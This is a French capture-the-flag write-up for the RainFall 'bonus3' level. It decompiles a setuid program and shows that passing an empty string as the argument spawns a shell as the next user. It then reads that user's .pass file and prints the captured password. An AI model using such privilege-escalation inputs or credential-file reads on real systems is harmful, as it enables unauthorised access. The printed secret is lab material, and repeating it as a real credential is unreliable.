# Bonus 3

```
bonus3@RainFall:~$ ./bonus3
bonus3@RainFall:~$ ./bonus3 test

bonus3@RainFall:~$ ./bonus3 test test
bonus3@RainFall:~$`
bonus3@RainFall:~$ ./bonus3
bonus3@RainFall:~$ ./bonus3 test

bonus3@RainFall:~$ ./bonus3 test test
bonus3@RainFall:~$
```

Le Programme prend 1 argument en parametre.

Decompilation :
```
undefined4 main(int param_1,int param_2)

{
  undefined4 uVar1;
  int iVar2;
  undefined4 *puVar3;
  byte bVar4;
  undefined4 local_98 [16];
  undefined local_57;
  char local_56 [66];
  FILE *local_14;

  bVar4 = 0;
  local_14 = fopen("/home/user/end/.pass","r");
  puVar3 = local_98;
  for (iVar2 = 0x21; iVar2 != 0; iVar2 = iVar2 + -1) {
    *puVar3 = 0;
    puVar3 = puVar3 + (uint)bVar4 * -2 + 1;
  }
  if ((local_14 == (FILE *)0x0) || (param_1 != 2)) {
    uVar1 = 0xffffffff;
  }
  else {
    fread(local_98,1,0x42,local_14);
    local_57 = 0;
    iVar2 = atoi(*(char **)(param_2 + 4));
    *(undefined *)((int)local_98 + iVar2) = 0;
    fread(local_56,1,0x41,local_14);
    fclose(local_14);
    iVar2 = strcmp((char *)local_98,*(char **)(param_2 + 4));
    if (iVar2 == 0) {
      execl("/bin/sh","sh",0);
    }
    else {
      puts(local_56);
    }
    uVar1 = 0;
  }
  return uVar1;
}
```

Le programme lis le fichier .pass et stocke le retour dans local_14.

Si le programme lis bien le fichier et que les parametres sont au nombre de 1, nous entrons dans le "else".

Nous ne pouvons pas effectuer plus de test sur gdb car il n'execute pas le binaire avec les droits superieurs, et donc le programme sort a la condition precedente.

Ici nous cherchons a executer le shell:
- local_98 est un buffer de 66 char de local_14
- ivar2 stocke"" un int du 1er parametre.
- "*(undefined *)((int)local_98 + iVar2) = 0;" cette ligne est interessante car il met la valeur 0 au l'emplacement memoire de local_98 + ivar2.
- Ensuite, est compare local_98 et le parametre, en char*.
- si identique, le shell est lance.

Du coup, si nous donnons une chaine vide en 1er parametre, local_98 vaudra 0 ou '\0' en char (car (int)local_98 + 0 = pointeur 0 de local_98)
Et comme (char *)local_98 = '\0' et *(char **)(param_2 + 4) = '\0', la condition est verifie.

```
bonus3@RainFall:~$ ./bonus3 ""
$ whoami
end
$ cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
bonus3@RainFall:~$ su end
Password:
end@RainFall:~$ cat end
Congratulations graduate!
```